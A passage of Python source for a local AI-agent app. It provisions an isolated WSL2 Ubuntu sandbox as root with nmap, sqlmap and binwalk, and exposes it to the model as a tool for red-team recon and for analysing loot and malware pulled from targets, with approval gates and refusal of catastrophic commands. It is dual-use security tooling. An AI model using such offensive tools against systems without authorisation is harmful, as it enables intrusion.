            tcs = []
            for tc in m["tool_calls"]:
                fn = tc.get("function") or {}
                args = fn.get("arguments")
                if isinstance(args, dict):
                    args = json.dumps(args, ensure_ascii=False)
                tcs.append({
                    "id": tc.get("id") or f"call_{len(tcs)}",
                    "type": "function",
                    "function": {"name": fn.get("name", ""), "arguments": args or "{}"},
                })
            if tcs:
                clean["tool_calls"] = tcs
        out.append(clean)
    return out


# ---- versioning ------------------------------------------------------------

# Match any fenced code block with optional language hint. We pick the first
# one whose contents look like HTML (DOCTYPE / <html). This is more lenient
# than requiring an explicit ```html tag — Qwen and others sometimes emit
# bare ``` fences for HTML.
HTML_BLOCK_RE = re.compile(r"```([a-zA-Z0-9_+\-]*)\s*\n([\s\S]*?)```", re.MULTILINE)


def _maybe_unescape_json_html(html: str) -> str:
    """Some local fine-tunes (especially Qwen3.6-Claude-distilled and other
    JSON-trained chats) emit HTML inside their ```html fence already escaped
    as a JSON string literal: real newlines become the two characters `\\n`,
    real quotes become `\\"`, and so on. The browser then renders those
    backslash-letter pairs as visible text in the preview iframe instead of
    treating them as line breaks — the page comes out as one giant unstyled
    blob with `\\n` peppered through it.
    Heuristic: lots of `\\n` sequences, very few real newlines → it's encoded.
    Decode by reversing the standard JSON string escapes (handle `\\\\` first
    via a sentinel so we don't double-process backslashes)."""
    if not html or "\\" not in html:
        return html
    real_newlines = html.count("\n")
    escaped_n = html.count("\\n")
    escaped_quote = html.count('\\"')
    # Need clear evidence of encoding: many escape sequences AND few real
    # newlines. A normal HTML file has dozens of real newlines, so even one
    # `\\n` next to fifty real ones is just incidental (e.g. inline JS).
    if escaped_n < 3 and escaped_quote < 3:
        return html
    if real_newlines >= max(5, escaped_n // 2):
        return html
    sentinel = "\x00BS\x00"
    decoded = (
        html
        .replace("\\\\", sentinel)
        .replace("\\n", "\n")
        .replace("\\r", "\r")
        .replace("\\t", "\t")
        .replace('\\"', '"')
        .replace("\\'", "'")
        .replace("\\/", "/")
        .replace(sentinel, "\\")
    )
    return decoded


def _extract_write_file_content(text: str) -> str | None:
    """Linear scan for `"content":"<JSON-string>"` inside a write_file tool
    call. Returns the JSON-string body (still escape-encoded) or None.
    Tolerates a missing closing quote (truncated streams). No regex, so no
    catastrophic backtracking on multi-KB bodies."""
    if not text:
        return None
    n = len(text)
    # Find the first occurrence of `"content"` that follows a `write_file`
    # mention — guards against unrelated keys named "content" elsewhere.
    wf = text.find("write_file")
    if wf == -1:
        return None
    key = text.find('"content"', wf)
    if key == -1:
        return None
    # Skip whitespace, expect `:`, more whitespace, then opening `"`.
    j = key + len('"content"')
    while j < n and text[j] in " \t\r\n":
        j += 1
    if j >= n or text[j] != ":":
        return None
    j += 1
    while j < n and text[j] in " \t\r\n":
        j += 1
    if j >= n or text[j] != '"':
        return None
    j += 1
    body_start = j
    # Walk until unescaped `"` or end-of-text.
    while j < n:
        c = text[j]
        if c == "\\":
            j += 2  # skip the escape and the escaped char
            continue
        if c == '"':
            return text[body_start:j]
        j += 1
    # Truncated — no closing quote found. Trim a trailing `"}}</tool_call>`
    # tail if present so the caller doesn't get JSON debris glued on.
    tail = text[body_start:]
    # Strip the most common truncation suffixes.
    for suffix in ('"}}</tool_call>', '"}}', '"}'):
        if tail.endswith(suffix):
            tail = tail[: -len(suffix)]
            break
    return tail or None


def extract_html(text: str) -> str | None:
    """Extract a complete HTML document from a model response.
    Tries, in order:
      1. Fenced code block tagged ```html (the canonical case)
      2. Any fenced code block whose contents start with <!DOCTYPE / <html
      3. The whole response if it starts with <!DOCTYPE / <html
      4. write_file tool_call regression: model wrapped HTML in a JSON
         tool_call instead of a fence (Qwen3 / DeepSeek-distilled families
         do this even in IDE mode). Pull `arguments.content` and use it.
      5. The substring from <!DOCTYPE / <html to </html> if found anywhere
    Lenient extraction is the right call here — false positives just preview
    the wrong block, false negatives mean the user gets no preview at all.
    Final pass: undo accidental JSON-string escaping if the model emitted it.
    """
    if not text:
        return None
    # 1 + 2: walk fenced blocks, prefer html-tagged, then any html-looking content.
    html_tagged = None
    html_untagged = None
    for m in HTML_BLOCK_RE.finditer(text):
        lang = (m.group(1) or "").lower()
        body = m.group(2).strip()
        bl = body.lower()
        if lang in ("html", "htm", "xhtml") and "<" in body and ">" in body:
            html_tagged = body
            break  # explicit html tag wins immediately
        if bl.startswith("<!doctype") or bl.startswith("<html"):
            if html_untagged is None:
                html_untagged = body
    if html_tagged:
        return _maybe_unescape_json_html(html_tagged)
    if html_untagged:
        return _maybe_unescape_json_html(html_untagged)
    # 3: bare HTML response, no fence
    stripped = text.strip()
    sl = stripped.lower()
    if sl.startswith("<!doctype") or sl.startswith("<html"):
        return _maybe_unescape_json_html(stripped)
    # 4: write_file tool_call regression. The model in IDE mode emits e.g.
    #     <tool_call>{"name":"write_file","arguments":{"path":"...",
    #                 "content":"<!DOCTYPE html>\\n..."}}</tool_call>
    # (sometimes without a closing tag). Pull the content arg out with a
    # linear indexOf-based scan — a regex with `(?:\\.|[^"\\])*` plus
    # surrounding `[\s\S]*?` catastrophic-backtracks on 30KB+ HTML bodies
    # and freezes the worker. The unescape pass at the end normalises
    # \\n / \\" back to real chars.
    if 'write_file' in text and '"content"' in text:
        body = _extract_write_file_content(text)
        if body and "<" in body and ">" in body:
            bl = body.lower()
            if "<!doctype" in bl or "<html" in bl:
                return _maybe_unescape_json_html(body)
    # 5: HTML embedded in prose — find first doctype/<html and last </html>
    lower = text.lower()
    starts = [i for i in (lower.find("<!doctype"), lower.find("<html")) if i >= 0]
    if starts:
        start = min(starts)
        end = lower.rfind("</html>")
        if end > start:
            return _maybe_unescape_json_html(text[start:end + len("</html>")].strip())
    return None


def save_version(chat_id: str, html: str, label: str = "") -> dict:
    folder = VERSIONS_DIR / chat_id
    folder.mkdir(parents=True, exist_ok=True)
    idx = len([f for f in folder.iterdir() if f.suffix == ".html"]) + 1
    name = f"v{idx:04d}.html"
    (folder / name).write_text(html, encoding="utf-8")
    meta_path = folder / "index.json"
    meta = load_json(meta_path, {"versions": []})
    entry = {"id": name, "n": idx, "t": int(time.time()), "label": label, "bytes": len(html.encode("utf-8"))}
    meta["versions"].append(entry)
    save_json(meta_path, meta)
    return entry


def list_versions(chat_id: str) -> list[dict]:
    folder = VERSIONS_DIR / chat_id
    meta = load_json(folder / "index.json", {"versions": []})
    return meta.get("versions", [])


def read_version(chat_id: str, vid: str) -> str | None:
    p = VERSIONS_DIR / chat_id / vid
    if not p.exists() or p.suffix != ".html":
        return None
    return p.read_text(encoding="utf-8")


# ---- Llama-Server 1-Click Bootstrapper -------------------------------------
import zipfile

# Thread-safe global state for the installer downloader
DOWNLOAD_LOCK = threading.Lock()
DOWNLOAD_STATE = {
    "status": "idle",       # idle, downloading, extracting, done, failed
    "bytes_written": 0,
    "bytes_total": 0,
    "speed": "0 KB/s",
    "error_msg": ""
}

def detect_hardware_specs() -> dict:
    """Detect GPU hardware availability on Windows to suggest the best build."""
    gpu_name = "Generic CPU"
    recommended_build = "CPU" # CPU, Vulkan, CUDA
    is_nvidia = False

    try:
        # Check via nvidia-smi command first
        res = subprocess.run(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"], 
                             capture_output=True, text=True, timeout=2)
        if res.returncode == 0 and res.stdout.strip():
            gpu_name = res.stdout.strip().split("\n")[0]
            recommended_build = "CUDA"
            is_nvidia = True
    except Exception:
        pass

    if not is_nvidia:
        try:
            # Query via WMI on Windows
            res = subprocess.run(["wmic", "path", "win32_VideoController", "get", "name"], 
                                 capture_output=True, text=True, timeout=2)
            if res.returncode == 0 and res.stdout.strip():
                lines = [l.strip() for l in res.stdout.strip().split("\n")[1:] if l.strip()]
                if lines:
                    gpu_name = lines[0]
                    # AMD, Nvidia or Intel GPUs get Vulkan
                    lower_name = gpu_name.lower()
                    if "nvidia" in lower_name:
                        recommended_build = "CUDA"
                    elif any(kw in lower_name for kw in ["amd", "radeon", "intel", "arc"]):
                        recommended_build = "Vulkan"
        except Exception:
            pass

    return {
        "gpu_name": gpu_name,
        "recommended_build": recommended_build
    }


def download_and_extract_llama(build_type: str):
    """Downloads and extracts the correct llama-server package inside a background thread."""
    global DOWNLOAD_STATE
    
    # Map to release b4600 assets (which contains mtmd.dll, llama-server.exe, and full speculation decoding)
    urls = {
        "CUDA": "https://github.com/ggerganov/llama.cpp/releases/download/b4600/llama-b4600-bin-win-cublas-cu12.2.0-x64.zip",
        "Vulkan": "https://github.com/ggerganov/llama.cpp/releases/download/b4600/llama-b4600-bin-win-vulkan-x64.zip",
        "CPU": "https://github.com/ggerganov/llama.cpp/releases/download/b4600/llama-b4600-bin-win-llvm-x64.zip"
    }
    
    url = urls.get(build_type, urls["CPU"])
    dest_dir = ROOT / "bin" / "llama"
    temp_zip = ROOT / "bin" / "temp_llama.zip"

    try:
        with DOWNLOAD_LOCK:
            DOWNLOAD_STATE.update({
                "status": "downloading",
                "bytes_written": 0,
                "bytes_total": 0,
                "speed": "0 KB/s",
                "error_msg": ""
            })

        # Ensure directory structure
        os.makedirs(dest_dir, exist_ok=True)
        os.makedirs(ROOT / "bin", exist_ok=True)

        req = urllib.request.Request(
            url, 
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AccurettaBootstrapper/1.0"}
        )

        with urllib.request.urlopen(req) as response:
            total_size = int(response.info().get("Content-Length", 0))
            with DOWNLOAD_LOCK:
                DOWNLOAD_STATE["bytes_total"] = total_size

            chunk_size = 128 * 1024
            bytes_written = 0
            start_time = time.time()
            last_calc_time = start_time
            last_bytes_written = 0

            with open(temp_zip, "wb") as f:
                while True:
                    chunk = response.read(chunk_size)
                    if not chunk:
                        break
                    f.write(chunk)
                    bytes_written += len(chunk)
                    
                    now = time.time()
                    # Calculate live speed every 0.5s
                    if now - last_calc_time >= 0.5:
                        duration = now - last_calc_time
                        bytes_diff = bytes_written - last_bytes_written
                        speed_val = bytes_diff / duration
                        
                        if speed_val > 1024 * 1024:
                            speed_str = f"{speed_val / (1024 * 1024):.1f} MB/s"
                        else:
                            speed_str = f"{speed_val / 1024:.1f} KB/s"
                            
                        last_calc_time = now
                        last_bytes_written = bytes_written
                        
                        with DOWNLOAD_LOCK:
                            DOWNLOAD_STATE.update({
                                "bytes_written": bytes_written,
                                "speed": speed_str
                            })
                            
            # Ensure full count represents at download finish
            with DOWNLOAD_LOCK:
                DOWNLOAD_STATE["bytes_written"] = total_size

        # Unzipping phase
        with DOWNLOAD_LOCK:
            DOWNLOAD_STATE["status"] = "extracting"

        with zipfile.ZipFile(temp_zip, "r") as z:
            z.extractall(dest_dir)

        # Cleanup downloaded zip file
        try:
            os.remove(temp_zip)
        except Exception:
            pass

        # Update settings to point to the newly downloaded llama-server binary
        llama_exe = dest_dir / "llama-server.exe"
        if safe_exists(llama_exe):
            s = get_settings()
            s["llama_bin"] = str(llama_exe.resolve())
            save_json(SETTINGS_FILE, s)
            broadcast_event({"type": "settings:update"})

        with DOWNLOAD_LOCK:
            DOWNLOAD_STATE["status"] = "done"

    except Exception as e:
        with DOWNLOAD_LOCK:
            DOWNLOAD_STATE.update({
                "status": "failed",
                "error_msg": str(e)
            })


# ---- WSL sandbox: isolated Linux guest for loot / offensive tooling ---------
#
# Why this exists: in a red-team run the exploits execute on the TARGET, not
# here - the only local risk is (a) parsing untrusted loot (firmware / binaries
# pulled back from a target) with local tools, and (b) the agent being steered
# by target content into touching the host. This provides an opt-in,
# kernel-isolated Ubuntu guest, `accuretta-sbx`, created via `wsl --import` so
# it never touches the user's other distros and needs no interactive first-run
# (imported distros default to root). The Windows workspace is visible inside
# at /mnt/... so tools operate on the same files; we translate with wslpath.
#
# Frictionless by design: on a machine that already has WSL2 there is no reboot
# and no admin - just download a clean rootfs, import it, apt-install a toolset.
# The only un-automatable steps exist solely when WSL itself is ABSENT: one UAC
# prompt + one reboot for `wsl --install` (a Windows constraint), plus firmware
# virtualization if it happens to be off. The setup wizard surfaces those
# explicitly rather than failing cryptically.

SANDBOX_DISTRO = "accuretta-sbx"
SANDBOX_DIR = DATA / "sandbox"                  # holds the distro's ext4.vhdx
SANDBOX_STATE_FILE = DATA / "sandbox_state.json"
# Ubuntu cloud rootfs (URLs verified live). `.tar.xz` - we decompress to `.tar`
# before import because `wsl --import` does not reliably accept xz. Tried in
# order; first reachable one wins.
SANDBOX_ROOTFS_URLS = [
    "https://cloud-images.ubuntu.com/releases/24.04/release/ubuntu-24.04-server-cloudimg-amd64-root.tar.xz",
    "https://cloud-images.ubuntu.com/noble/current/noble-server-cloudimg-amd64-root.tar.xz",
    "https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-amd64-root.tar.xz",
]
# Kept modest so the first provision is minutes, not an hour. The agent can
# apt-install more on demand once the guest is up.
SANDBOX_APT_TOOLS = [
    "ca-certificates", "curl", "wget", "git", "python3", "python3-pip",
    "file", "unzip", "xxd", "binutils", "binwalk", "sqlmap", "nmap",
]

_NO_WINDOW = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
SANDBOX_LOCK = threading.Lock()
SANDBOX_PROGRESS = {
    "status": "idle",   # idle|downloading|extracting|importing|provisioning|done|failed
    "step": "",         # human-readable current step
    "pct": 0,           # 0..100 best-effort
    "log": [],          # ring buffer of setup output lines
    "error": "",
}


def _sbx_set(**kw):
    with SANDBOX_LOCK:
        SANDBOX_PROGRESS.update(kw)


def _sbx_log(msg: str):
    line = str(msg).rstrip()
    if not line:
        return
    with SANDBOX_LOCK:
        SANDBOX_PROGRESS["log"].append(line)
        if len(SANDBOX_PROGRESS["log"]) > 300:
            del SANDBOX_PROGRESS["log"][:-300]
    try:
        print("[sandbox]", line, flush=True)
    except Exception:
        pass


def _wsl_exe() -> str:
    return shutil.which("wsl") or "wsl"


def _wsl_run(args, timeout=60):
    """Run a wsl.exe command, return (returncode, combined_output).
    WSL_UTF8=1 makes wsl.exe emit UTF-8 (its native output is UTF-16LE, which
    otherwise arrives full of NUL bytes)."""
    env = dict(os.environ)
    env["WSL_UTF8"] = "1"
    try:
        r = subprocess.run([_wsl_exe(), *args], capture_output=True, text=True,
                           timeout=timeout, env=env, creationflags=_NO_WINDOW,
                           encoding="utf-8", errors="replace")
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return 124, "timeout"
    except FileNotFoundError:
        return 127, "wsl not found"
    except Exception as e:
        return 1, str(e)


def _wsl_bash(distro, script, timeout=120):
    """Run a bash script as root inside `distro`, passing it over STDIN.

    Critical: wsl.exe performs its own $VAR substitution on command-line
    arguments (expanding undefined vars to empty and ignoring bash quoting), so
    passing a script via `bash -lc "<script>"` silently corrupts anything with
    shell variables — `for t in ...; do ... $t ...` yields empty `$t`, and even
    single-quoted `$t` gets stripped. Feeding the script through stdin bypasses
    that arg mangling completely. Returns (returncode, combined_output)."""
    env = dict(os.environ)
    env["WSL_UTF8"] = "1"
    try:
        r = subprocess.run([_wsl_exe(), "-d", distro, "-u", "root", "--", "bash", "-l"],
                           input=script, capture_output=True, text=True, timeout=timeout,
                           env=env, creationflags=_NO_WINDOW, encoding="utf-8", errors="replace")
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return 124, "timeout"
    except FileNotFoundError:
        return 127, "wsl not found"
    except Exception as e:
        return 1, str(e)


def _wsl_in(distro, script, timeout=120):
    """Run a bash script as root inside a distro (stdin-fed, see _wsl_bash)."""
    return _wsl_bash(distro, script, timeout=timeout)


def _wsl_distros() -> list:
    """Names of installed distros (empty if WSL absent)."""
    rc, out = _wsl_run(["-l", "-q"], timeout=15)
    if rc != 0:
        return []
    names = []
    for line in out.replace("\x00", "").splitlines():
        n = line.strip()
        if n and not n.lower().startswith("windows subsystem"):
            names.append(n)
    return names


def wsl_probe() -> dict:
    """Cheap snapshot of WSL + sandbox state for the setup wizard and settings.
    Safe to call on a poll."""
    info = {
        "wsl_installed": False, "wsl_version": "", "kernel": "",
        "distros": [], "sandbox_distro": SANDBOX_DISTRO,
        "sandbox_present": False, "sandbox_provisioned": False,
        "ready": False, "state": "no_wsl", "provision": None,
    }
    rc, out = _wsl_run(["--version"], timeout=15)
    if rc == 0 and out.strip():
        info["wsl_installed"] = True
        for line in out.splitlines():
            low = line.lower()
            if "wsl version" in low:
                info["wsl_version"] = line.split(":", 1)[-1].strip()
            elif "kernel version" in low:
                info["kernel"] = line.split(":", 1)[-1].strip()
    else:
        rc2, _ = _wsl_run(["--status"], timeout=15)
        info["wsl_installed"] = (rc2 == 0)
    if info["wsl_installed"]:
        info["distros"] = _wsl_distros()
        info["sandbox_present"] = SANDBOX_DISTRO in info["distros"]
    st = load_json(SANDBOX_STATE_FILE, {})
    info["sandbox_provisioned"] = bool(st.get("provisioned")) and info["sandbox_present"]
    if not info["wsl_installed"]:
        info["state"] = "no_wsl"
    elif not info["sandbox_present"]:
        info["state"] = "no_distro"
    elif not info["sandbox_provisioned"]:
        info["state"] = "present_unprovisioned"
    else:
        info["state"] = "ready"
    info["ready"] = info["state"] == "ready"
    with SANDBOX_LOCK:
        info["provision"] = dict(SANDBOX_PROGRESS, log=list(SANDBOX_PROGRESS["log"][-40:]))
    return info


def _sbx_download_rootfs(dest) -> None:
    """Download the Ubuntu rootfs with live progress, trying URLs in order."""
    last_err = ""
    for url in SANDBOX_ROOTFS_URLS:
        try:
            _sbx_set(status="downloading", step="Downloading Ubuntu rootfs...", pct=0)
            _sbx_log(f"GET {url}")
            req = urllib.request.Request(url, headers={"User-Agent": "AccurettaSandbox/1.0"})
            with urllib.request.urlopen(req, timeout=60) as resp:
                total = int(resp.info().get("Content-Length", 0))
                written = 0
                last = time.time()
                last_b = 0
                with open(dest, "wb") as f:
                    while True:
                        chunk = resp.read(256 * 1024)
                        if not chunk:
                            break
                        f.write(chunk)
                        written += len(chunk)
                        now = time.time()
                        if now - last >= 0.5:
                            pct = int(written * 100 / total) if total else 0
                            spd = (written - last_b) / (now - last)
                            mb = written // (1024 * 1024)
                            tot = f" / {total // (1024*1024)}MB" if total else ""
                            _sbx_set(status="downloading", pct=pct,
                                     step=f"Downloading rootfs - {mb}MB{tot} ({spd/(1024*1024):.1f} MB/s)")
                            last, last_b = now, written
            _sbx_log(f"Downloaded {written // (1024*1024)}MB")
            return
        except Exception as e:
            last_err = str(e)
            _sbx_log(f"download failed for {url}: {e}")
    raise RuntimeError(f"all rootfs URLs failed: {last_err}")


def _sbx_decompress_xz(src, dst) -> None:
    import lzma
    with lzma.open(src, "rb") as fi, open(dst, "wb") as fo:
        while True:
            chunk = fi.read(1024 * 1024)
            if not chunk:
                break
            fo.write(chunk)


def _sbx_stream_provision(script, timeout=1800) -> int:
    """Run a provisioning script in the guest, streaming stdout into the log."""
    env = dict(os.environ)
    env["WSL_UTF8"] = "1"
    cmd = [_wsl_exe(), "-d", SANDBOX_DISTRO, "-u", "root", "--", "bash", "-lc", script]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                         text=True, env=env, creationflags=_NO_WINDOW, bufsize=1,
                         encoding="utf-8", errors="replace")
    t0 = time.time()
    try:
        for line in p.stdout:
            _sbx_log(line.rstrip())
            if time.time() - t0 > timeout:
                p.kill()
                _sbx_log("provision timed out")
                break
        p.wait(timeout=30)
    finally:
        try:
            p.stdout.close()
        except Exception:
            pass
    return p.returncode if p.returncode is not None else 1


def _sbx_provision_thread(reinstall: bool = False) -> None:
    """Background orchestrator: download -> decompress -> import -> apt-provision.
    Idempotent and resumable - skips stages already complete."""
    try:
        _sbx_set(status="downloading", step="Checking WSL...", pct=0, error="")
        probe = wsl_probe()
        if not probe["wsl_installed"]:
            _sbx_set(status="failed", step="WSL not installed",
                     error="WSL is not installed. Open an elevated PowerShell, run "
                           "`wsl --install`, reboot once, then retry.")
            return

        os.makedirs(SANDBOX_DIR, exist_ok=True)
        have = SANDBOX_DISTRO in _wsl_distros()

        if have and reinstall:
            _sbx_log(f"Removing existing {SANDBOX_DISTRO} for a clean reinstall...")
            _wsl_run(["--terminate", SANDBOX_DISTRO], timeout=60)
            _wsl_run(["--unregister", SANDBOX_DISTRO], timeout=120)
            have = False

        if not have:
            tar_xz = SANDBOX_DIR / "rootfs.tar.xz"
            tar_path = SANDBOX_DIR / "rootfs.tar"
            _sbx_download_rootfs(tar_xz)
            _sbx_set(status="extracting", step="Decompressing rootfs (xz -> tar)...", pct=0)
            _sbx_log("Decompressing rootfs...")
            _sbx_decompress_xz(tar_xz, tar_path)
            try:
                os.remove(tar_xz)
            except Exception:
                pass
            _sbx_set(status="importing", step="Creating isolated distro...", pct=0)
            _sbx_log(f"wsl --import {SANDBOX_DISTRO}")
            rc, out = _wsl_run(["--import", SANDBOX_DISTRO, str(SANDBOX_DIR),
                                str(tar_path), "--version", "2"], timeout=600)
            _sbx_log((out or "").strip() or f"import rc={rc}")
            if rc != 0 or SANDBOX_DISTRO not in _wsl_distros():
                _sbx_set(status="failed", step="Import failed",
                         error=f"wsl --import failed (rc={rc}): {(out or '').strip()[:400]}")
                return
            try:
                os.remove(tar_path)
            except Exception:
                pass
        else:
            _sbx_log(f"{SANDBOX_DISTRO} already imported - provisioning only.")

        _sbx_set(status="provisioning", step="Installing toolset (apt)...", pct=0)
        save_json(SANDBOX_STATE_FILE, {"provisioned": False, "distro": SANDBOX_DISTRO,
                                       "updated": time.time()})
        tools = " ".join(SANDBOX_APT_TOOLS)
        script = (
            "set -e; export DEBIAN_FRONTEND=noninteractive; "
            # A fresh Ubuntu cloud rootfs ships /etc/resolv.conf as a symlink to a
            # systemd-resolved path that isn't running under WSL, so DNS is dead
            # and apt fails. Drop the dangling symlink and write a static resolver
            # for this session; once the symlink is gone WSL auto-generates a
            # working resolv.conf on later boots.
            "rm -f /etc/resolv.conf; "
            "printf 'nameserver 1.1.1.1\\nnameserver 8.8.8.8\\n' > /etc/resolv.conf; "
            "echo '== apt-get update =='; apt-get update; "
            f"echo '== installing: {tools} =='; "
            f"apt-get install -y --no-install-recommends {tools}; "
            "apt-get clean; echo PROVISION_DONE"
        )
        _sbx_stream_provision(script, timeout=1800)

        rc, out = _wsl_in(SANDBOX_DISTRO, "echo ACCURETTA_SBX_OK", timeout=60)
        if "ACCURETTA_SBX_OK" not in out:
            _sbx_set(status="failed", step="Verification failed",
                     error=(out or "").strip()[:400])
            return
        save_json(SANDBOX_STATE_FILE, {"provisioned": True, "distro": SANDBOX_DISTRO,
                                       "tools": SANDBOX_APT_TOOLS, "updated": time.time()})
        _sbx_set(status="done", step="Sandbox ready.", pct=100)
        _sbx_log("Sandbox ready.")
        broadcast_event({"type": "sandbox:update"})
    except Exception as e:
        _sbx_set(status="failed", step="Error", error=str(e))
        _sbx_log(f"ERROR: {e}")


def start_sandbox_setup(reinstall: bool = False) -> dict:
    """Kick off provisioning in a background thread unless one is already live."""
    with SANDBOX_LOCK:
        busy = SANDBOX_PROGRESS["status"] in ("downloading", "extracting", "importing", "provisioning")
    if busy:
        return {"started": False, "reason": "already running"}
    _sbx_set(status="downloading", step="Starting...", pct=0, error="", log=[])
    threading.Thread(target=_sbx_provision_thread, args=(reinstall,), daemon=True).start()
    return {"started": True}


def _win_to_wsl_path(p: str) -> str:
    """Translate a Windows path to its /mnt/... path inside the guest."""
    if not p:
        return "~"
    rc, out = _wsl_run(["-d", SANDBOX_DISTRO, "-u", "root", "--", "wslpath", "-u", p], timeout=20)
    if rc == 0 and out.strip():
        return out.strip().splitlines()[0]
    m = re.match(r"^([A-Za-z]):[\\/](.*)$", p)
    if m:
        return "/mnt/" + m.group(1).lower() + "/" + m.group(2).replace("\\", "/")
    return p


def sandbox_run(command: str, cwd: str = "", timeout: int = 300) -> dict:
    """Run a shell command inside the isolated accuretta-sbx guest. Windows
    workspace paths are visible at /mnt/... ; pass cwd as a Windows path and it
    is translated. This is the execution primitive the model-facing sandbox
    tool / auto-routing will build on."""
    probe = wsl_probe()
    if not probe["ready"]:
        return {"error": f"sandbox not ready (state={probe['state']}). Set it up in Settings -> Sandbox.",
                "state": probe["state"]}
    wsl_cwd = _win_to_wsl_path(cwd) if cwd else ""
    prefix = f"cd {shlex.quote(wsl_cwd)} 2>/dev/null; " if wsl_cwd else ""
    rc, out = _wsl_bash(SANDBOX_DISTRO, prefix + command, timeout=timeout)
    return {"exit_code": rc, "output": (out or "")[-20000:], "distro": SANDBOX_DISTRO,
            "cwd": wsl_cwd or "~"}


def sandbox_selftest() -> dict:
    """Canned diagnostic used by the Settings 'Test' button - never runs
    client-supplied commands, just proves the guest is alive and tooled."""
    probe = wsl_probe()
    if not probe["ready"]:
        return {"ok": False, "state": probe["state"],
                "error": "sandbox not ready - set it up first."}
    rc, out = _wsl_in(SANDBOX_DISTRO,
                      "uname -a; echo '---'; for t in python3 nmap sqlmap binwalk file git; do "
                      "printf '%-10s ' \"$t\"; (command -v $t || echo 'missing'); done",
                      timeout=60)
    return {"ok": rc == 0, "output": (out or "").strip()[-4000:], "exit_code": rc}


# --- model-facing sandbox tool ----------------------------------------------
# `sandbox_run` is only advertised to the model once the guest is provisioned
# (see _active_tools). Probing WSL is a subprocess, too slow to run every turn,
# so readiness is cached with a short TTL and short-circuited by the state file
# (no probe at all until the user has actually provisioned).
_SBX_READY_CACHE = {"t": 0.0, "ready": False}


def _sandbox_ready_cached(ttl: float = 30.0) -> bool:
    now = time.time()
    if now - _SBX_READY_CACHE["t"] < ttl:
        return _SBX_READY_CACHE["ready"]
    if not load_json(SANDBOX_STATE_FILE, {}).get("provisioned"):
        _SBX_READY_CACHE.update(t=now, ready=False)
        return False
    ready = bool(wsl_probe().get("ready"))
    _SBX_READY_CACHE.update(t=now, ready=ready)
    return ready


def tool_sandbox_run(args: dict) -> dict:
    """Run a shell command inside the isolated accuretta-sbx Linux guest. Gated
    the same way as run_powershell: catastrophic commands are hard-refused, and
    write/modify commands need approval. The guest is kernel-isolated from the
    host except the workspace, which is visible at /mnt/... — so a delete
    targeting /mnt IS a delete of the user's real files, hence the same guards."""
    command = (args.get("command") or "").strip()
    if not command:
        return {"error": "empty command"}
    catastrophic = _catastrophic_cmd(command)
    if catastrophic:
        return {
            "error": (
                f"refused: this command {catastrophic}. Even inside the sandbox, "
                "/mnt/<drive> is a window into the user's real filesystem, so this "
                "is hard-blocked. Run it yourself if you truly intend it."
            ),
            "refused_command": command,
            "catastrophic": True,
        }
    if needs_approval(command):
        approval = request_approval(
            title="Sandbox command (write/modify)",
            command=command,
            details={"kind": "sandbox", "distro": SANDBOX_DISTRO},
        )
        if approval.get("decision") != "approve":
            return {"error": f"user denied sandbox command ({approval.get('status')})"}
    return sandbox_run(command, cwd=(args.get("cwd") or ""), timeout=int(args.get("timeout", 300)))


TOOLS["sandbox_run"] = {
    "description": (
        "Run a shell command inside an ISOLATED Ubuntu Linux guest (kernel-isolated "
        "from the host via WSL2). Use this for anything that shouldn't touch the host "
        "directly: running offensive/recon tools (nmap, sqlmap, binwalk), and — most "
        "importantly — unpacking or analyzing UNTRUSTED files pulled back from a target "
        "(firmware images, malware samples, archives) so a booby-trapped file can't "
        "compromise the user's machine. The user's workspace is visible inside the guest "
        "at /mnt/<drive>/... ; pass `cwd` as a normal Windows path and it is translated. "
        "Runs as root. Read-only commands run freely; write/modify commands require approval; "
        "commands that would wipe a drive are refused. Preinstalled: python3, nmap, sqlmap, "
        "binwalk, binutils, file, xxd, unzip, git, curl (apt-get more as needed)."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "command": {"type": "string", "description": "Bash command line to run inside the guest."},
            "cwd": {"type": "string", "description": "Optional working directory as a Windows path (e.g. the workspace folder); translated to /mnt/..."},
            "timeout": {"type": "integer", "description": "seconds, default 300"},
        },
        "required": ["command"],
    },
    "fn": tool_sandbox_run,
}


# ---- HTTP handler ----------------------------------------------------------

MIME = {
    ".html": "text/html; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".jsx": "application/javascript; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".svg": "image/svg+xml",
    ".json": "application/json; charset=utf-8",
    ".md": "text/markdown; charset=utf-8",
    ".txt": "text/plain; charset=utf-8",
    ".ico": "image/x-icon",
    ".webmanifest": "application/manifest+json",
}

STATIC_WHITELIST = {
    "index.html", "app.js", "app.css", "colors_and_type.css",
    # legacy logo file kept around so older clients / cached HTML still resolve
    "logo-mark.png", "black.png",
    # new brand assets — see index.html <link rel="..."> tags
    "logo-mark-dark.png", "logo-mark-light.png",
    "favicon.png", "favicon-32.png",
    "apple-touch-icon.png",
    "app-icon-192.png", "app-icon-512.png",
    "manifest.webmanifest",
}


class Handler(BaseHTTPRequestHandler):
    server_version = "Accuretta/1.0"

    def log_message(self, fmt, *args):
        sys.stderr.write("[%s] %s\n" % (self.log_date_time_string(), fmt % args))

    # ---- helpers

    def _set_cors(self):
        # Same-origin only: the UI is served by THIS bridge, so it needs no CORS.
        # Advertising Access-Control-Allow-Origin:* let any website you visit read
        # the agent's responses / drive it from your browser — deliberately gone.
        return

    def _host_ok(self) -> bool:
        # DNS-rebinding defense. Legit access is always via localhost or an IP
        # literal (LAN or Tailscale). A Host header that's a DOMAIN NAME is the
        # signature of a rebinding attack aimed at this port, so reject it.
        host = (self.headers.get("Host") or "").strip()
        if not host:
            return True
        if host.startswith("["):                       # IPv6, e.g. [::1]:8787
            hostname = host[1:host.find("]")] if "]" in host else host[1:]
        else:
            hostname = host.split(":", 1)[0]
        hostname = hostname.strip().lower()
        # localhost + Tailscale MagicDNS names (….ts.net is Tailscale-owned, not
        # publicly registrable, so it can't be used to rebind at your machine).
        if hostname == "localhost" or hostname.endswith(".ts.net"):
            return True
        import ipaddress
        try:
